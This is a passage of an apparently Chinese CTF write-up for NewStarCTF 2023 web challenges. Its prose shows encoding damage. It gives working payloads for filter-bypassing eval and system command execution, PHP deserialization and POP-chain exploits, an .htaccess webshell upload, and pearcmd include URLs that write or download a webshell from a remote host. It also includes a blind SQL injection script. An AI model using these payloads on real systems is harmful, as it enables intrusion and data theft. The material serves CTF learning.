        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|ls/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æœ€åå°±æ˜¯</p>
<blockquote>
<p>**password&#x3D;114514&amp;e[v.a.l&#x3D;echo <code>more /fl??</code>;**<br><img src="https://img-blog.csdnimg.cn/9c50573ea17242a8a5b0d8ec5c77f872.png" alt="1"></p>
</blockquote>
<h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>æ‰“å¼€å°±æ˜¯ä¸€ä¸ªç™»å½•æ¡†<br>å°è¯•adminå¼±å¯†ç 000000æˆåŠŸç™»å½•é€šè¿‡æŸ¥çœ‹burpçš„è®°å½•å‘ç°302è·³è½¬ï¼Œå­˜åœ¨flagã€‚<br><img src="https://img-blog.csdnimg.cn/b2b750f96f9645d28a39e9f346dfd175.png" alt="2"></p>
<h2 id="week2-web"><a href="#week2-web" class="headerlink" title="week2-web"></a>week2-web</h2><p>æŒ‘ä¸€äº›é‡è¦çš„å†™å§ã€‚ã€‚ã€‚</p>
<h3 id="Unserializeï¼Ÿ"><a href="#Unserializeï¼Ÿ" class="headerlink" title="Unserializeï¼Ÿ"></a>Unserializeï¼Ÿ</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Maybe you need learn some knowledge about deserialize?</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œçš„cmdæ˜¯ç§æœ‰å±æ€§</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|tac|more|tail|base/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>privateååºåˆ—åŒ–åæ˜¯%00(ç±»å)%00(å˜é‡å)ï¼Œprotectæ˜¯%00*%00(å˜é‡å)</p>
</blockquote>
<p>exp</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"nl /th1s_1s_fffflllll4444aaaggggg"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>æ–‡ä»¶ä¸Šä¼ ã€<code>.htaccessæ–‡ä»¶</code><br>å…ˆä¸Šä¼ .htaccessæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/06c6774f41e748d3937afeb063413849.png" alt="123"></p>
<p>åœ¨ä¸Šä¼ å›¾ç‰‡é©¬<br><img src="https://img-blog.csdnimg.cn/d6feb5d5e82246a686a979196cfb1fcf.png" alt="123"><br>å³å¯æˆåŠŸå‘½ä»¤æ‰§è¡Œ</p>
<h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>.gitæºç æ³„éœ²<br><img src="https://img-blog.csdnimg.cn/94e16be6682f42139c3071d6964ebc59.png" alt="456"><br>æŸ¥çœ‹bo0g1pop.phpæ–‡ä»¶</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>if (&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;]))</code>æ— å‚æ•°rce</p>
<blockquote>
<p>GETï¼š<br>star&#x3D;eval(next(getallheaders()));<br><img src="https://img-blog.csdnimg.cn/bffdd37418c0412c80b75fb545225002.png" alt="123"></p>
</blockquote>
<h2 id="week3-web"><a href="#week3-web" class="headerlink" title="week3-web"></a>week3-web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>çŸ¥è¯†ç‚¹ï¼šä¸‹è½½æœ¨é©¬æ–‡ä»¶åˆ°é¶æœºã€register_argc_argv</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|log|session|filter|input|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment"># Something in phpinfo.php!</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…ˆåŒ…å«phpinfo.phpæ–‡ä»¶çœ‹çœ‹<br>æœç´¢flagå‘ç°æç¤º<code>register_argc_argv</code><br><img src="https://img-blog.csdnimg.cn/b99c8a88c07a4e6286d25ca285e74158.png" alt="456"><br>æ‰¾æ‰¾æœ‰æ²¡æœ‰ç›¸å…³æ¼æ´ï¼Œæ°å¥½æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">registerargcargvä¸include to RCEçš„å·§å¦™ç»„åˆ</a></p>
<blockquote>
<p>&#x2F;&#x2F;é€šè¿‡æœ¬åœ°ç›´æ¥å†™å…¥webshell,æ³¨æ„è¿™é‡Œæœ€å¥½æŠ“åŒ…ç„¶åç”¨burpsuiteæˆ–è€…ç›´æ¥curlæ‰§è¡Œï¼Œå¦åˆ™æµè§ˆå™¨ä¼šå°†&lt; ? &gt; è½¬ä¹‰<br>&#x2F;&#x2F; config-createå¯ä»¥ç›´æ¥åˆ›å»ºé…ç½®æ–‡ä»¶ï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»ä»¥&#x2F;å¼€å¤´<br><code>http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php</code><br>&#x2F;&#x2F; é€šè¿‡è¿œç¨‹ç›´æ¥ä¸‹è½½webshell<br>&#x2F;&#x2F; webç›®å½•å¯å†™</p>
<ul>
<li><code>http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</code></li>
<li><code>http://ip:port/tmp/pear/download/evil.php</code><br>&#x2F;&#x2F; tmpç›®å½•å¯å†™</li>
<li><code>http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</code></li>
<li><code>http://ip:port/include.php?f=/tmp/pear/download/evil</code></li>
</ul>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7d3cce3881de4f9a89bc8e659bf3f395.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/66e920198f60410f8ba08d44e18bb64f.png" alt="789"><br>ç„¶åè®¿é—®<code>/tmp/pear/download/1.php</code>å‘ç°æˆåŠŸä¼ å…¥<br><img src="https://img-blog.csdnimg.cn/1daa56ab972347a98aa42ad9931a2d1a.png" alt="456"></p>
<h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>çŸ¥è¯†ç‚¹ï¼šsqlç›²æ³¨<br><img src="https://img-blog.csdnimg.cn/a6ea86a9c7d14d3d853ce0e18ea3c65f.png" alt="1"><br>å°è¯•æ³¨å…¥ï¼š<br>å•å¼•å·ä¸å›æ˜¾<br><code>1TMP3074&#39;Or 1=1 -- -</code><br>æˆåŠŸå›æ˜¾<br>burpæµ‹è¯•è¿‡æ»¤çš„å‡½æ•°æˆ–å­—ç¬¦ï¼Œå‘ç°å¦‚ä¸‹çš„è¢«è¿‡æ»¤äº†<br><img src="https://img-blog.csdnimg.cn/8bc362b3464d4e77a078e91c27a32ddf.png" alt="1"><br>ä½¿ç”¨order byå‘ç°å­˜åœ¨5ä¸ªè¡¨ï¼Œä½†æ˜¯åé¢å†ä½¿ç”¨unionæ˜¯å‘ç°æ²¡æœ‰unionï¼Œæ¢ä¸€ç§æ–¹æ³•<br>ä½¿ç”¨ç›²æ³¨åˆ¤æ–­å½“å‰æ•°æ®åº“åçš„å­—ç¬¦æ•°<br><code>?id=1TMP3074&#39; Or length(database()) &gt; 2--+</code>å›æ˜¾<br><code>?id=1TMP3074&#39; Or length(database()) &gt; 3--+</code>ä¸å›æ˜¾ï¼Œè¯´æ˜å½“å‰æ•°æ®åº“åçš„å­—ç¬¦æ•°ä¸ºä¸‰ã€‚<br>ç„¶ååˆ¤æ–­æ•°æ®åº“ååˆ°åº•æ˜¯ä»€ä¹ˆ<br><code>?id=1TMP3074&#39;Or mid(database(),1,1)= &#39;b&#39; --</code>è¿™æ ·å¤ªæ…¢äº†ï¼Œä½¿ç”¨è„šæœ¬<br>æœ€åçš„expï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://13d36774-d283-422c-98f2-9164d199a034.node4.buuoj.cn:81/?id=TMP0919'AND "</span>

result <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Ascii(Substr((Select flag from here_is_flag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">--+'</span></span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"points"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># æš‚åœ1ç§’ï¼Œé™ä½çˆ¬å–é€Ÿåº¦</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/18afb59598064b03b3ab0b7644b4a319.png" alt="1"></p>
<h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><p>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–ä¸²é“¾å­ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Begin</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to NewStarCTF 2023!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Then</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$func</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Good Job!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Handle</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Super</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">getStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"==GAME OVER=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">-></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">WhiteGod</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¤§è‡´å®¡ä¸€ä¸‹ä»£ç å¯ä»¥å‘ç°å‡ºå£ä¸º<code>WhiteGod</code>ç±»</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token keyword">class</span> <span class="token class-name-definition class-name">WhiteGod</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span><span class="token comment">//èµ‹å€¼ä¸ºsystem</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token comment">//èµ‹å€¼ä¸ºls</span>
 				
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä¸¤è€…ç»“åˆå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ   </span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆå…¥å£å°±æ˜¯<code>Begin</code>ç±»</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Begin</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
 
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to NewStarCTF 2023!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¤§è‡´é“¾å­ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Begin</span><span class="token operator">::</span><span class="token constant">__destruct</span><span class="token operator">-></span><span class="token class-name static-context">Then</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token operator">-></span><span class="token class-name static-context">Super</span><span class="token operator">::</span><span class="token constant">__invoke</span><span class="token operator">-></span><span class="token class-name static-context">Handle</span><span class="token operator">::</span><span class="token constant">__call</span><span class="token operator">-></span><span class="token class-name static-context">CTF</span><span class="token operator">::</span><span class="token constant">end</span><span class="token operator">-></span><span class="token class-name static-context">WhiteGod</span><span class="token operator">::</span><span class="token constant">__unset</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Begin</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Then</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘Thenç±»ä¸­çš„__toString()æ–¹æ³•</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Then</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>

        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘Superç±»çš„__invoke()æ–¹æ³•</span>
    <span class="token punctuation">&#125;</span>
<span class="token comment">/*
    public function __toString()
    &#123;
        ($this->func)();
        return "Good Job!";
	&#125;
*/</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Handle</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
